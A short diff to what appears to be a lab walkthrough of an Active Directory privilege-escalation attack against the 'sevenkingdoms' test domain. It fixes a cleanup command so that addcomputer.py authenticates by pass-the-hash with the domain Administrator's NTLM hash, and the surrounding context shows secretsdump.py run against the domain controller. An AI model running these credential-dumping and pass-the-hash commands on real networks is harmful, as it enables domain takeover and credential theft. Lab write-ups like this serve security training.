@@ -73,5 +73,5 @@ secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winte
 Clean up by deleting the computer we created with the administrator account hash we just get
 
 ```bash
-addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain
+addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'
 ```
